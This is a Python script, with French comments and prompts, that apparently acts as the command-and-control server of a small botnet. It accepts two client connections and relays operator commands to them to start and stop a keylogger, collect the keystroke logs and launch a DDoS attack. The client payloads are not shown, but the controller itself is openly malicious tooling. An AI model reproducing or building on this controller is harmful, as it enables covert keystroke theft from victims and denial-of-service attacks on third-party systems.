import socket
import time
import argparse


class MasterProject:
    def __init__(self,connexion_principale):
        self.connexion_principale = socket
        self.list_client = list_client =[]

    def run(self, connexion_principale, list_client):


        self.parameters()
        connexion_principale = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connexion_principale.bind((host, port))
        print("Le serveur est demarré sur le port {}".format(port))


        connexion_principale.listen(5)


        print("Le serveur écoute à présent sur le port {}".format(port))


        compteur_client = 0
        while compteur_client < 2:
            connexion_avec_client, infos_connexion = connexion_principale.accept()
            ip, port1 = str(infos_connexion[0]), str(infos_connexion[1]) 
            list_client.append(connexion_avec_client)
            print ("Connecter avec " + ip + ":" + port1)

            compteur_client += 1
            print (len(list_client))

        ask = input("Que souhaitez-vous faire ?? : ")   
       
        while ask != "fin_serveur": 
                
            print (len(list_client))

            if ask == "start_log" : 
                self.start_log(list_client)
                ask = input("Que souhaitez-vous faire ?? : ")

            elif ask == "stop_log":
                self.stop_log(list_client)
                ask = input("Que souhaitez-vous faire ?? : ")
                
            elif ask == "get_log":
                self.get_log(list_client)
                ask = input("Que souhaitez-vous faire ?? : ")
                    
            elif ask == "ddos":
                self.ddos_log(list_client)
                ask = input("Que souhaitez-vous faire ?? : ")

            elif ask == "fin_connexion":
                self.fin_client(list_client)
                ask = input("Que souhaitez-vous faire ?? : ")

            elif ask == "fin_serveur":
                print("Le serveur est fermé !")       
                connexion_principale.close()



    def start_log(self, list_client):
        i = 0
        while i < 2 :
            data = "start_Keylogger"
            list_client[i].send(data.encode("utf-8"))
            i += 1
       
    def stop_log(self, list_client):
        i = 0
        while i < 2 :
            data = "stop_Keylogger"
            list_client[i].send(data.encode("utf-8"))
            i += 1

    def get_log(self, list_client):
        i = 0
        while i < 2 :
            data = "get_log"
            list_client[i].send(data.encode("utf-8"))
            i += 1 

    def ddos_log(self, list_client):
        i = 0
        while i < 2 :
            data = "start_ddos"
            list_client[i].send(data.encode("utf-8"))
            i += 1 
        
        
    def fin_client(self, list_client):
        i = 0
        while i < 2 :
            data = "fin_connexion"
            list_client[i].send(data.encode("utf-8"))
            i += 1

    def parameters(self):

        global port
        global host
       
        param = argparse.ArgumentParser()
        param.add_argument("-p","--port",type=int,dest="port",help="port du socket")
        param.add_argument("-i","--ip",dest="host",help="hote du socket")
        args = param.parse_args()

        if args.port != 0 :
            port = args.port
        if args.host != 0 :
            host = args.host

            
           
         
            
      
master = MasterProject(socket)
master.run(socket, [])



